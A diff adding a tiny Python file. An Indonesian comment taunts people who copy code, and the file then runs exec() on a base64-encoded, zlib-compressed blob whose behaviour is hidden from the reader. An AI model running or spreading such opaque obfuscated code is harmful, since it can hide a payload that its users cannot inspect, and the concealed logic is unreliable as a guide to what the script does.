@@ -1,0 +1,3 @@
+#mau nyolong lagi? tsk kan udah ada tu text nya :v
+import marshal,zlib,base64
+exec(zlib.decompress(base64.b64decode("eJwrKMrMK9FQUlKKMTA2jja0NjbO5eV6NK0DhKZOVwADKBcZgaSwC8NZqIoR4gjjJyKbPnXKo6kToAjNCGQpEJoL1zMRl6OmTsRlzURkNpIgsjEY8lMw/UeyBVgEEYypszAth1uAEcgI5SjiwGCai08K01HoqsGWAsVQghse6Fgk5irgEIaJzoUz0FXO5eUCJjtNADSzgkg=")))
